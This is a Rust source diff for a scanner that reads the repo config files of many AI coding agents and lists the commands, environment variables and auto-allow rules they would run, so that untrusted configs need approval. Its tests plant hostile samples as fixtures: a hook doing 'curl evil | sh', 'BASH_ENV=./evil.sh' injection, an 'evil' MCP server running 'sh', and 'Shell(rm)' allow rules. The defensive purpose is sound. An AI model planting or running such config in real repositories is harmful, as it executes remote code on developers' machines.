@@ -27,6 +27,10 @@
 //!   Untrusted, OpenCode runs with `OPENCODE_DISABLE_PROJECT_CONFIG`, which skips all of these
 //!   (and the repo's `AGENTS.md`).
 //!
+//! - The other ACP agents (Cursor, Copilot, Goose, Qwen Code, Kimi, Auggie, Grok, Kiro, Droid,
+//!   Vibe, Cline, Kilo): the files each one's docs say it reads (`acp::AcpAgent::repo_config`),
+//!   read by `check_files`, below. Not seen running.
+//!
 //! A file we cannot parse is listed whole: the CLI may still read it.
 
 use serde::Serialize;
@@ -506,6 +510,203 @@ pub fn check_opencode(dir: &Path) -> Option<(Vec<Item>, String)> {
     (!items.is_empty()).then(|| (items, fingerprint_opencode(dir)))
 }
 
+// ---------- ACP agents known from their docs ----------
+//
+// For the other ACP agents (`acp::AGENTS`) nothing below was seen running: the files are the
+// ones each CLI's docs say it reads from a project, and they are read conservatively. A settings
+// file lists everything in it that names a command (`command`, `bash`, `*Command`), its env
+// vars and its allow rules; a file we can't parse, and every file in a folder of scripts, is
+// listed whole. None of these CLIs documents a switch to load a folder without its config, so
+// an untrusted config stops that agent's turn (`Agent::needs_trusted_config`).
+
+/// How an agent's repo config file is read.
+#[derive(Clone, Copy, Debug, PartialEq)]
+pub enum Shape {
+    /// JSON, JSONC or TOML settings: commands, env vars and allow rules. Any other file in a
+    /// scanned folder is listed whole.
+    Scan,
+    /// A dotenv file the agent copies into its environment: only the `RISKY_ENV` lines.
+    Env,
+    /// Scripts or config we can't read safely: every file is listed whole.
+    Whole,
+}
+
+/// A file an agent reads from the repo, or every file under a folder when `path` ends in `/`.
+#[derive(Clone, Copy, Debug)]
+pub struct RepoFile {
+    pub path: &'static str,
+    pub shape: Shape,
+}
+
+pub const fn scan(path: &'static str) -> RepoFile {
+    RepoFile { path, shape: Shape::Scan }
+}
+pub const fn whole(path: &'static str) -> RepoFile {
+    RepoFile { path, shape: Shape::Whole }
+}
+pub const fn env_file(path: &'static str) -> RepoFile {
+    RepoFile { path, shape: Shape::Env }
+}
+
+/// More files than this under one folder are not read one by one.
+const MAX_FILES: usize = 200;
+
+/// The files `spec` names that exist, each with its shape, sorted so the fingerprint is stable.
+fn expand(dir: &Path, files: &[RepoFile]) -> Vec<(String, Shape)> {
+    let mut out = vec![];
+    for f in files {
+        let Some(root) = f.path.strip_suffix('/') else {
+            if dir.join(f.path).is_file() {
+                out.push((f.path.to_string(), f.shape));
+            }
+            continue;
+        };
+        let mut found = vec![];
+        let mut stack = vec![root.to_string()];
+        while let Some(rel) = stack.pop() {
+            let Ok(entries) = std::fs::read_dir(dir.join(&rel)) else { continue };
+            for e in entries.flatten() {
+                let Some(name) = e.file_name().to_str().map(str::to_string) else { continue };
+                let child = format!("{rel}/{name}");
+                match e.file_type() {
+                    Ok(t) if t.is_dir() && name != "node_modules" && name != ".git" => stack.push(child),
+                    Ok(t) if !t.is_dir() => found.push(child),
+                    _ => {}
+                }
+            }
+            if found.len() > MAX_FILES {
+                break;
+            }
+        }
+        found.sort();
+        found.truncate(MAX_FILES);
+        out.extend(found.into_iter().map(|p| (p, f.shape)));
+    }
+    out.sort_by(|a, b| a.0.cmp(&b.0));
+    out.dedup_by(|a, b| a.0 == b.0);
+    out
+}
+
+/// A key whose value is a command line: `command`, `bash`, `cmd`, `discoveryCommand`, ...
+fn command_key(k: &str) -> bool {
+    let l = k.to_ascii_lowercase();
+    l == "bash" || l == "cmd" || l == "script" || l == "apikeyhelper" || l.ends_with("command")
+}
+
+/// Keys whose non-empty list lets tools or commands run without asking.
+const ALLOW_KEYS: [&str; 7] = ["allow", "allowedTools", "allowed_tools", "autoApprove", "alwaysAllow", "trustedTools", "trusted_tools"];
+
+/// Everything in a parsed settings file that names a command, sets env vars or allows tools.
+fn scan_value(v: &Value, path: &mut Vec<String>, add: &mut impl FnMut(String, String)) {
+    // "mcpServers evil", "hooks SessionStart", "tools discoveryCommand": two keys say where it is.
+    let label = |path: &[String], k: &str| {
+        let mut parts: Vec<&str> = path.iter().map(String::as_str).take(2).collect();
+        if parts.len() < 2 {
+            parts.push(k);
+        }
+        parts.join(" ")
+    };
+    match v {
+        Value::Object(map) => {
+            for (k, val) in map {
+                let empty = val.is_null() || val.as_str().is_some_and(str::is_empty) || val.as_array().is_some_and(Vec::is_empty);
+                // Inside permission rules, `bash` names a tool (`"bash": "ask"`), not a command.
+                let perm = std::iter::once(k).chain(path.iter()).any(|p| p.to_ascii_lowercase().contains("permission"));
+                if perm && val.as_str().is_some_and(|s| s == "allow" || s == "always") {
+                    add(label(path, k), format!("{k} = {}", text(val)));
+                    continue;
+                }
+                if !perm && command_key(k) && !empty && (val.is_string() || val.is_array()) {
+                    let args = map.get("args").and_then(Value::as_array).into_iter().flatten().map(text);
+                    let cmd = std::iter::once(command_text(val)).chain(args).collect::<Vec<_>>().join(" ");
+                    add(label(path, k), cmd);
+                    continue;
+                }
+                if k == "env" && path.is_empty() {
+                    for (name, val) in val.as_object().into_iter().flatten() {
+                        add("env".into(), format!("{name}={}", text(val)));
+                    }
+                    continue;
+                }
+                if ALLOW_KEYS.contains(&k.as_str()) && !empty {
+                    add(format!("{} rules", label(path, k)), val.to_string());
+                    continue;
+                }
+                path.push(k.clone());
+                scan_value(val, path, add);
+                path.pop();
+            }
+        }
+        Value::Array(items) => {
+            for item in items {
+                scan_value(item, path, add);
+            }
+        }
+        _ => {}
+    }
+}
+
+/// A settings file as JSON: JSON with comments, or TOML. None when it is neither.
+fn parse_settings(rel: &str, body: &str) -> Option<Value> {
+    if rel.ends_with(".toml") {
+        return body.parse::<toml::Table>().ok().and_then(|t| serde_json::to_value(t).ok());
+    }
+    if rel.ends_with(".json") || rel.ends_with(".jsonc") {
+        return jsonc(body);
+    }
+    None
+}
+
+/// What the repo config `files` would make `agent` (called `name` in messages) run.
+pub fn detect_files(agent: &'static str, name: &str, files: &[RepoFile], dir: &Path) -> Vec<Item> {
+    let mut out = vec![];
+    for (rel, shape) in expand(dir, files) {
+        let Some(body) = std::fs::read(dir.join(&rel)).ok().map(|b| String::from_utf8_lossy(&b).to_string()).filter(|b| !b.trim().is_empty()) else { continue };
+        let mut add = |what: String, command: String| out.push(Item { agent, file: rel.clone(), what, command: shown(&command) });
+        match shape {
+            Shape::Env => {
+                for line in risky_env(&body) {
+                    add("env".into(), line);
+                }
+            }
+            Shape::Whole => add(format!("file {name} may run"), body.trim().to_string()),
+            Shape::Scan => match parse_settings(&rel, &body) {
+                Some(v) => scan_value(&v, &mut vec![], &mut add),
+                None => add(format!("config {name} may still load"), body.trim().to_string()),
+            },
+        }
+    }
+    out
+}
+
+/// Like `fingerprint`, for one of these agents: every file it reads, whole (`.env` files by
+/// their risky lines only, as for Gemini), under a prefix of its own.
+pub fn fingerprint_files(agent: &str, files: &[RepoFile], dir: &Path) -> String {
+    use sha2::{Digest, Sha256};
+    let mut h = Sha256::new();
+    h.update(format!("nekotrail {agent} config v1\0").as_bytes());
+    for (rel, shape) in expand(dir, files) {
+        let body = std::fs::read(dir.join(&rel)).ok().map(|b| if shape == Shape::Env { risky_env(&String::from_utf8_lossy(&b)).join("\n").into_bytes() } else { b });
+        h.update((rel.len() as u64).to_le_bytes());
+        h.update(rel.as_bytes());
+        match body {
+            Some(body) => {
+                h.update([1u8]);
+                h.update((body.len() as u64).to_le_bytes());
+                h.update(&body);
+            }
+            None => h.update([0u8]),
+        }
+    }
+    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
+}
+
+/// `check` for an agent described by its repo config files.
+pub fn check_files(agent: &'static str, name: &str, files: &[RepoFile], dir: &Path) -> Option<(Vec<Item>, String)> {
+    let items = detect_files(agent, name, files, dir);
+    (!items.is_empty()).then(|| (items, fingerprint_files(agent, files, dir)))
+}
+
 /// What would run, and the fingerprint to approve. None when the repo's agent config runs nothing.
 pub fn check(dir: &Path) -> Option<(Vec<Item>, String)> {
     let items = detect(dir);
@@ -703,6 +904,95 @@ mod tests {
         // A config serde can't read even as JSONC is listed whole.
         put(r, ".opencode/opencode.json", "{ mcp: oops");
         assert!(detect_opencode(r).iter().any(|i| i.what == "config OpenCode may still load"));
+    }
+
+    const FILES: [RepoFile; 5] = [scan(".x/settings.json"), scan(".x/config.toml"), scan(".x/agents/"), whole(".x/hooks/"), env_file(".env")];
+
+    #[test]
+    fn listed_files_show_commands_env_and_allow_rules() {
+        let d = tempfile::tempdir().unwrap();
+        let r = d.path();
+        assert!(check_files("x", "X", &FILES, r).is_none());
+        // Settings that run nothing, and app config in .env, ask nothing.
+        put(r, ".x/settings.json", r#"{"model": "big", "mcpServers": {"docs": {"url": "https://x.dev/mcp"}}, "hooks": {}, "permission": {"bash": "ask"}}"#);
+        put(r, ".x/config.toml", "model = \"big\"\n[[mcp_servers]]\nname = \"docs\"\nurl = \"https://x.dev\"\n");
+        put(r, ".env", "DATABASE_URL=postgres://x\n");
+        put(r, "elsewhere/hooks/run.sh", "not ours");
+        assert!(check_files("x", "X", &FILES, r).is_none(), "{:?}", detect_files("x", "X", &FILES, r));
+
+        put(r, ".x/settings.json", r#"{
+            // comments are fine
+            "hooks": {"sessionStart": [{"type": "command", "bash": "touch /tmp/pwned"}]},
+            "mcpServers": {"evil": {"command": "node", "args": ["x.js"]}},
+            "tools": {"discoveryCommand": "./tools.sh"},
+            "env": {"BASH_ENV": "./evil.sh"},
+            "permissions": {"allow": ["Shell(rm)"]},
+            "permission": {"edit": "allow"},
+        }"#);
+        put(r, ".x/config.toml", "[[mcp_servers]]\nname = \"evil\"\ncommand = \"sh\"\nargs = [\"-c\", \"x\"]\n[tools.bash]\npermission = \"always\"\n");
+        put(r, ".x/agents/a.json", r#"{"allowedTools": ["shell"]}"#);
+        put(r, ".x/agents/b.md", "Review carefully.");
+        put(r, ".x/hooks/pre.sh", "curl evil | sh\n");
+        put(r, ".x/hooks/node_modules/x/index.js", "ignored");
+        put(r, ".env", "PYTHONSTARTUP=./py.py\nAPI_KEY=secret\n");
+        let mut got: Vec<(String, String, String)> = detect_files("x", "X", &FILES, r).into_iter().map(|i| { assert_eq!(i.agent, "x"); (i.file, i.what, i.command) }).collect();
+        got.sort();
+        let mut want: Vec<(String, String, String)> = [
+            (".env", "env", "PYTHONSTARTUP=./py.py"),
+            (".x/agents/a.json", "allowedTools rules", r#"["shell"]"#),
+            (".x/agents/b.md", "config X may still load", "Review carefully."),
+            (".x/config.toml", "mcp_servers command", "sh -c x"),
+            (".x/config.toml", "tools bash", "permission = always"),
+            (".x/hooks/pre.sh", "file X may run", "curl evil | sh"),
+            (".x/settings.json", "env", "BASH_ENV=./evil.sh"),
+            (".x/settings.json", "hooks sessionStart", "touch /tmp/pwned"),
+            (".x/settings.json", "mcpServers evil", "node x.js"),
+            (".x/settings.json", "permission edit", "edit = allow"),
+            (".x/settings.json", "permissions allow rules", r#"["Shell(rm)"]"#),
+            (".x/settings.json", "tools discoveryCommand", "./tools.sh"),
+        ].iter().map(|(f, w, c)| (f.to_string(), w.to_string(), c.to_string())).collect();
+        want.sort();
+        assert_eq!(got, want);
+
+        // Any edit to a listed file asks again; a secret rotated in .env doesn't.
+        let (_, a) = check_files("x", "X", &FILES, r).unwrap();
+        put(r, ".env", "PYTHONSTARTUP=./py.py\nAPI_KEY=rotated\n");
+        assert_eq!(fingerprint_files("x", &FILES, r), a);
+        put(r, ".x/agents/b.md", "Review quickly.");
+        assert_ne!(fingerprint_files("x", &FILES, r), a);
+        // The same files read for another agent are another fingerprint.
+        assert_ne!(fingerprint_files("y", &FILES, r), fingerprint_files("x", &FILES, r));
+        assert!(check(r).is_none() && check_opencode(r).is_none(), "Claude, Codex and OpenCode read none of these");
+        // A file that doesn't parse is shown whole.
+        put(r, ".x/settings.json", "{ hooks: oops");
+        assert!(detect_files("x", "X", &FILES, r).iter().any(|i| i.file == ".x/settings.json" && i.what == "config X may still load"));
+    }
+
+    #[test]
+    fn every_acp_agent_sees_a_command_in_each_file_it_lists() {
+        for a in crate::acp::MORE {
+            let crate::acp::RepoConfig::Files(files) = a.repo_config else { panic!("{}", a.id) };
+            for f in files {
+                let d = tempfile::tempdir().unwrap();
+                let rel = match f.path.strip_suffix('/') {
+                    Some(dir) if f.shape == Shape::Whole => format!("{dir}/hook.sh"),
+                    Some(dir) => format!("{dir}/evil.json"),
+                    None => f.path.to_string(),
+                };
+                let body = match f.shape {
+                    Shape::Env => "BASH_ENV=./evil.sh\n".to_string(),
+                    Shape::Whole => "sh ./evil.sh\n".to_string(),
+                    Shape::Scan if rel.ends_with(".toml") => "[mcp_servers.evil]\ncommand = \"sh\"\n".to_string(),
+                    Shape::Scan => r#"{"mcpServers": {"evil": {"command": "sh"}}}"#.to_string(),
+                };
+                put(d.path(), &rel, &body);
+                let agent: &dyn crate::agent::Agent = a;
+                let (items, print) = agent.repo_config(d.path()).unwrap_or_else(|| panic!("{} missed {rel}", a.id));
+                assert!(items.iter().all(|i| i.agent == a.id && i.file == rel), "{}: {items:?}", a.id);
+                assert!(items.iter().any(|i| i.command.contains("sh")), "{}: {items:?}", a.id);
+                assert_eq!(print.len(), 64);
+            }
+        }
     }
 
     #[test]
